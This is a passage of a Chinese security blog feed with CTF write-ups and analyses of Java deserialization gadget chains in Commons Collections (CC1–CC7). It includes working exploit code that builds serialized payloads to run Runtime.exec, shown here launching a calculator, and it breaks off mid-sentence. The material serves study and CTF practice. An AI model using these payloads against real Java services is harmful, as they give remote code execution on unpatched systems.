keyword">return</span> <span class="token string">"enjoy it."</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这是标准的类加载并且调用了newInstance();实例化，因此只要把恶意代码写在静态代码块即可触发。</p><p>而该恶意函数为toString，这是一个很常见的方法，因此直接从readObject入手，在CC5中的反序列化入口类BadAttributeValueExpException正是触发了toString方法。</p><p>**注意:BadAttributeValueExpException源于jdk自带的rj.jar包中。 **</p><pre class="line-numbers language-java"><code class="language-java">Object valObj <span class="token operator">=</span> gf<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"val"</span><span class="token punctuation">,</span> null<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//...略</span><span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>System<span class="token punctuation">.</span><span class="token function">getSecurityManager</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> null                <span class="token operator">||</span> valObj <span class="token keyword">instanceof</span> <span class="token class-name">Long</span>                <span class="token operator">||</span> valObj <span class="token keyword">instanceof</span> <span class="token class-name">Integer</span>                <span class="token operator">||</span> valObj <span class="token keyword">instanceof</span> <span class="token class-name">Float</span>                <span class="token operator">||</span> valObj <span class="token keyword">instanceof</span> <span class="token class-name">Double</span>                <span class="token operator">||</span> valObj <span class="token keyword">instanceof</span> <span class="token class-name">Byte</span>                <span class="token operator">||</span> valObj <span class="token keyword">instanceof</span> <span class="token class-name">Short</span>                <span class="token operator">||</span> valObj <span class="token keyword">instanceof</span> <span class="token class-name">Boolean</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            val <span class="token operator">=</span> valObj<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">// the serialized object is from a version without JDK-8019292 fix</span>            val <span class="token operator">=</span> System<span class="token punctuation">.</span><span class="token function">identityHashCode</span><span class="token punctuation">(</span>valObj<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"@"</span> <span class="token operator">+</span> valObj<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>没有设置安全管理器，System.getSecurityManager() &#x3D;&#x3D; null，而valObj源自于val，该值需要通过反射修改为ToStringBean toStringbean即可触发toString。</p><p>注意序列化后的字符串用Tools的base64编码。</p><p>由于base64编码后的字符串存在+号，因此需要url编码一层。</p><p>gadget:</p><pre class="line-numbers language-java"><code class="language-java">BadAttributeValueExpException#readObjectToStringBean#toStringdefineClassnewInstance<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h4><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">import</span> com<span class="token punctuation">.</span>ezgame<span class="token punctuation">.</span>ctf<span class="token punctuation">.</span>tools<span class="token punctuation">.</span>ToStringBean<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>runtime<span class="token punctuation">.</span>AbstractTranslet<span class="token punctuation">;</span><span class="token keyword">import</span> javassist<span class="token punctuation">.</span>*<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>management<span class="token punctuation">.</span>BadAttributeValueExpException<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>ByteArrayOutputStream<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>FileOutputStream<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>IOException<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>ObjectOutputStream<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Field<span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token keyword">static</span> com<span class="token punctuation">.</span>ezgame<span class="token punctuation">.</span>ctf<span class="token punctuation">.</span>tools<span class="token punctuation">.</span>Tools<span class="token punctuation">.</span>base64Encode<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Payload</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> NoSuchFieldException<span class="token punctuation">,</span> CannotCompileException<span class="token punctuation">,</span> NotFoundException<span class="token punctuation">,</span> IOException<span class="token punctuation">,</span> IllegalAccessException <span class="token punctuation">{</span>        ClassPool pool <span class="token operator">=</span> ClassPool<span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        pool<span class="token punctuation">.</span><span class="token function">insertClassPath</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ClassClassPath</span><span class="token punctuation">(</span>AbstractTranslet<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        CtClass cc <span class="token operator">=</span> pool<span class="token punctuation">.</span><span class="token function">makeClass</span><span class="token punctuation">(</span><span class="token string">"Squirt1e"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        String cmd <span class="token operator">=</span> <span class="token string">"java.lang.Runtime.getRuntime().exec(\"calc.exe\");"</span><span class="token punctuation">;</span>        cc<span class="token punctuation">.</span><span class="token function">makeClassInitializer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">insertBefore</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">;</span>        cc<span class="token punctuation">.</span><span class="token function">setSuperclass</span><span class="token punctuation">(</span>pool<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>AbstractTranslet<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        cc<span class="token punctuation">.</span><span class="token function">writeFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> classBytes <span class="token operator">=</span> cc<span class="token punctuation">.</span><span class="token function">toBytecode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ToStringBean toStringBean<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ToStringBean</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Class <span class="token class-name">toStringBeanClass</span> <span class="token operator">=</span> ToStringBean<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>        Field ClassByte <span class="token operator">=</span> toStringBeanClass<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"ClassByte"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ClassByte<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ClassByte<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>toStringBean<span class="token punctuation">,</span>classBytes<span class="token punctuation">)</span><span class="token punctuation">;</span>        BadAttributeValueExpException badAttributeValueExpException <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BadAttributeValueExpException</span><span class="token punctuation">(</span>null<span class="token punctuation">)</span><span class="token punctuation">;</span>        Class<span class="token operator">&lt;</span>BadAttributeValueExpException<span class="token operator">></span> badAttributeValueExpExceptionClass <span class="token operator">=</span> BadAttributeValueExpException<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>        Field badAttributeValueExpExceptionClassField  <span class="token operator">=</span> badAttributeValueExpExceptionClass<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"val"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        badAttributeValueExpExceptionClassField<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        badAttributeValueExpExceptionClassField<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>badAttributeValueExpException<span class="token punctuation">,</span>toStringBean<span class="token punctuation">)</span><span class="token punctuation">;</span>        ByteArrayOutputStream byteArrayOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ObjectOutputStream objectOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>byteArrayOutputStream<span class="token punctuation">)</span><span class="token punctuation">;</span>        objectOutputStream<span class="token punctuation">.</span><span class="token function">writeUTF</span><span class="token punctuation">(</span><span class="token string">"gadgets"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        objectOutputStream<span class="token punctuation">.</span><span class="token function">writeInt</span><span class="token punctuation">(</span><span class="token number">2021</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        objectOutputStream<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>badAttributeValueExpException<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytes1 <span class="token operator">=</span> byteArrayOutputStream<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        String s <span class="token operator">=</span> <span class="token function">base64Encode</span><span class="token punctuation">(</span>bytes1<span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h4><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20220901092859118.png" alt="image-20220901092859118"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
            <tag> CC </tag>
            
            <tag> WP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CC利用链总结</title>
      <link href="/2021/12/25/cc-li-yong-lian-zong-jie/"/>
      <url>/2021/12/25/cc-li-yong-lian-zong-jie/</url>
      
        <content type="html"><![CDATA[<h4 id="CC利用链一览图"><a href="#CC利用链一览图" class="headerlink" title="CC利用链一览图"></a>CC利用链一览图</h4><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/CC%20(2).png" alt="CC (2)" style="zoom:200%;" /><h4 id="CC1-1"><a href="#CC1-1" class="headerlink" title="CC1-1"></a>CC1-1</h4><h5 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h5><ol><li>jdk&lt;&#x3D;8u71</li><li>CommonsCollections 3.1 - 3.2.1、4.0</li></ol><h5 id="gadget"><a href="#gadget" class="headerlink" title="gadget"></a>gadget</h5><pre><code>AnnotationInvocationHandler#readobjectAbstractInputCheckedMapDecorator.MapEntry#setValueTransformedMap#checksetValueChainedTransformer#transformInvokerTransformer#transform</code></pre><h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><p>8u71后对AnnotationInvocationHandler类进行了修复，因此在高版本中无法利用。</p><h4 id="CC1-2"><a href="#CC1-2" class="headerlink" title="CC1-2"></a>CC1-2</h4><h5 id="版本-1"><a href="#版本-1" class="headerlink" title="版本"></a>版本</h5><ol><li>jdk&lt;&#x3D;8u71</li><li>CommonsCollections 3.1 - 3.2.1、4.0</li></ol><h5 id="gadget-1"><a href="#gadget-1" class="headerlink" title="gadget"></a>gadget</h5><pre><code>AnnotationInvocationHandler#readobjectProxy(AnnotationInvocationHandler).xxxAnnotationInvocationHandler#invokeLazyMap#getChainedTransformer#transformInvokerTransformer#transform</code></pre><h5 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h5><p>8u71后对AnnotationInvocationHandler类进行了修复，因此在高版本中无法利用。</p><h4 id="CC2"><a href="#CC2" class="headerlink" title="CC2"></a>CC2</h4><h5 id="限制"><a href="#限制" class="headerlink" title="限制"></a>限制</h5><ol><li>CommonsCollections 4.0</li></ol><h5 id="gadget-2"><a href="#gadget-2" class="headerlink" title="gadget"></a>gadget</h5><pre><code>PriorityQueue#readObjectTransformingComparator#compareInvokerTransformer#transformTemplatesImpl#newTransformerdefineClassnewInstance</code></pre><h5 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h5><p>从优先队列入手从而触发TransformerImpl#newTransformer实现类加载。当然也可以通过链式调用执行RCE。</p><h4 id="CC3"><a href="#CC3" class="headerlink" title="CC3"></a>CC3</h4><h5 id="限制-1"><a href="#限制-1" class="headerlink" title="限制"></a>限制</h5><ol><li>CommonsCollections 3.1 - 3.2.1</li><li>jdk&lt;&#x3D;8u71</li></ol><h5 id="原生gadget"><a href="#原生gadget" class="headerlink" title="原生gadget"></a>原生gadget</h5><pre><code>AnnotationInvocationHandler#readobjectProxy(AnnotationInvocationHandler).xxxAnnotationInvocationHandler#invokeLazyMap#getChainedTransformer#transformInstantiateTransformer#transfromTrAXFilter#TrAXFilterTransformerImpl#newTransformerdefineClassnewInstance</code></pre><h5 id=""><a href="#" class="headerlink" title=""></a></h5><h5 id="总结-3"><a href="#总结-3" class="headerlink" title="总结"></a>总结</h5><p>CC3提供了一条能通过TransformerImpl实现类加载的链子，这样的目的是绕过黑名单InvokerTransformer。</p><h4 id="CC4"><a href="#CC4" class="headerlink" title="CC4"></a>CC4</h4><h5 id="限制-2"><a href="#限制-2" class="headerlink" title="限制"></a>限制</h5><ol><li>CommonsCollections 4.0</li></ol><h5 id="gadget-3"><a href="#gadget-3" class="headerlink" title="gadget"></a>gadget</h5><pre><code>PriorityQueue#readObjectTransformingComparator#compareChainedTransformer#transformInstantiateTransformer#transfromTrAXFilter#TrAXFilterTransformerImpl#newTransformerdefineClassnewInstance</code></pre><h5 id="总结-4"><a href="#总结-4" class="headerlink" title="总结"></a>总结</h5><p>CC4的前半段用的是CC2，后半段用的是CC3，两者结合实现了CommonsCollections 4.0版本下的绕过黑名单InvokerTransformer的类加载。</p><h4 id="CC5"><a href="#CC5" class="headerlink" title="CC5"></a>CC5</h4><h5 id="限制-3"><a href="#限制-3" class="headerlink" title="限制"></a>限制</h5><ol><li>CommonsCollections 3.1 - 3.2.1</li></ol><h5 id="gadget-4"><a href="#gadget-4" class="headerlink" title="gadget"></a>gadget</h5><pre><code>BadAttributeValueExpException#readObjectTiedMapEntry#toStringLazyMap#getChainedTransformer#transformInvokerTransformer#transform</code></pre><h5 id="总结-5"><a href="#总结-5" class="headerlink" title="总结"></a>总结</h5><p>CC5用到了BadAttributeValueExpException，从CC6的角度看用处不是很大。不过从CC3的角度看，CC5解决了jdk高版本的限制。</p><h4 id="CC6"><a href="#CC6" class="headerlink" title="CC6"></a>CC6</h4><h5 id="限制-4"><a href="#限制-4" class="headerlink" title="限制"></a>限制</h5><ol><li>CommonsCollections 3.1 - 3.2.1</li></ol><h5 id="gadget-5"><a href="#gadget-5" class="headerlink" title="gadget"></a>gadget</h5><pre><code>HashMap#readobjectHashMap#hashTiedMapEntry#getValueChainedTransformer#transformInvokerTransformer#transform</code></pre><h5 id="总结-6"><a href="#总结-6" class="headerlink" title="总结"></a>总结</h5><p>CC6解决了jdk高版本的限制，并且HashMap这个东西这么重要不会被ban。</p><h4 id="CC7"><a href="#CC7" class="headerlink" title="CC7"></a>CC7</h4><h5 id="限制-5"><a href="#限制-5" class="headerlink" title="限制"></a>限制</h5><ol><li>CommonsCollections 3.1 - 3.2.1</li></ol><h5 id="gadget-6"><a href="#gadget-6" class="headerlink" title="gadget"></a>gadget</h5><pre><code>Hashtable#readObjectHashtable#reconstitutionPutAbstractMap#equalsLazyMap#getChainedTransformer#transformInvokerTransformer#transform</code></pre><h5 id="总结-7"><a href="#总结-7" class="headerlink" title="总结"></a>总结</h5><p>CC7用到了hash碰撞，Hashtable这个东西一般也不会被ban。</p><h4 id="CC6-CC3"><a href="#CC6-CC3" class="headerlink" title="CC6+CC3"></a>CC6+CC3</h4><h5 id="限制-6"><a href="#限制-6" class="headerlink" title="限制"></a>限制</h5><ol><li>CommonsCollections 3.1 - 3.2.1</li></ol><h5 id="改进gadget"><a href="#改进gadget" class="headerlink" title="改进gadget"></a>改进gadget</h5><pre><code>HashMap#readobjectHashMap#hashTiedMapEntry#getValueLazyMap#getChainedTransformer#transformInstantiateTransformer#transfromTrAXFilter#TrAXFilterTransformerImpl#newTransformerdefineClassnewInstance</code></pre><h5 id="总结-8"><a href="#总结-8" class="headerlink" title="总结"></a>总结</h5><p>CC3后半段其实就是提供了一条能通过TransformerImpl实现类加载的链子，这样的目的就是绕过黑名单InvokerTransformer。gadget前半段用的是CC1，但这样会收到jdk版本限制，因此用CC6前半段就可以绕过高版本限制了。</p>]]></content>
      
      
      <categories>
          
          <category> 日常学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> gadget </tag>
            
            <tag> Java安全 </tag>
            
            <tag> CC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CC6分析</title>
      <link href="/2021/12/16/cc6-fen-xi/"/>
      <url>/2021/12/16/cc6-fen-xi/</url>
      
        <content type="html"><![CDATA[<blockquote><p>在jdk8u71之前，CC1是能用的。在8u71之后，AnnotationInvocationHandler#readObject 逻辑发生改变，CC6正是一条支持jdk8高版本的gadget。</p></blockquote><h5 id="gadget图"><a href="#gadget图" class="headerlink" title="gadget图"></a>gadget图</h5><p>跟着老哥整理了一下CC1两条路以及CC6的gadget图。</p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/CC.png" alt="CC"  /><h5 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h5><p>上回CC1—LazyMap讲到LazyMap#get方法</p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20220823132756796.png" alt="image-20220823132756796" style="zoom: 67%;" /><p>我们通过LazyMap#decorate方法使factory&#x3D;chainedTransformer就可以触发chainedTransformer#transform方法。</p><p>由于AnnotationInvocationHandler这条路走不了了，我们只能另辟蹊径，最终大佬找到了TiedMapEntry#getValue。</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20220824194044429.png" alt="image-20220824194044429"></p><p>而TiedMapEntry是能实例化的，令map&#x3D;lazyMap，key的话我们先随便传一个字符串即可。</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20220824194141124.png" alt="image-20220824194141124"></p><p>目前exp为：</p><pre class="line-numbers language-java"><code class="language-java">        Transformer<span class="token punctuation">[</span><span class="token punctuation">]</span> transformers<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span>Runtime<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getMethod"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>Class<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span>null<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>Object<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>Object<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>null<span class="token punctuation">,</span>null<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"calc"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">}</span><span class="token punctuation">;</span>        ChainedTransformer c<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>        HashMap map<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Map lazyMap<span class="token operator">=</span> LazyMap<span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>map<span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        TiedMapEntry tiedMapEntry<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">TiedMapEntry</span><span class="token punctuation">(</span>lazyMap<span class="token punctuation">,</span><span class="token string">"Squirt1e"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>而TiedMapEntry#getValue是由TiedMapEntry#hashCode触发，这就好办了，URLDNS那条链子就是用到了hashCode。</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20220824194505416.png" alt="image-20220824194505416"></p><p>此时exp为：</p><pre class="line-numbers language-java"><code class="language-java">        Transformer<span class="token punctuation">[</span><span class="token punctuation">]</span> transformers<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span>Runtime<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getMethod"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>Class<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span>null<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>Object<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>Object<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>null<span class="token punctuation">,</span>null<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"calc"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">}</span><span class="token punctuation">;</span>        ChainedTransformer c<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>        HashMap map<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Map lazyMap<span class="token operator">=</span> LazyMap<span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>map<span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        TiedMapEntry tiedMapEntry<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">TiedMapEntry</span><span class="token punctuation">(</span>lazyMap<span class="token punctuation">,</span><span class="token string">"jajaja"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        HashMap<span class="token operator">&lt;</span>Object<span class="token punctuation">,</span>String<span class="token operator">></span> hashmap<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token operator">&lt;</span>Object<span class="token punctuation">,</span>String<span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        hashmap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>tiedMapEntry<span class="token punctuation">,</span><span class="token string">"Squirt1e"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>还记得URLDNS的朋友会记得一个坑，也就是hashmap.put也会执行hashCode方法。</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20220824195806254.png" alt="image-20220824195806254"></p><p>也就是说在序列化和反序列化之前就会触发hashCode从而导致提前RCE。这会影响我们的判断，因此最好是让他put的时候不要触发。</p><p>这很好解决,我们只要随意破坏链子其中一个节点，比如令Map lazyMap&#x3D; LazyMap.decorate(map,new 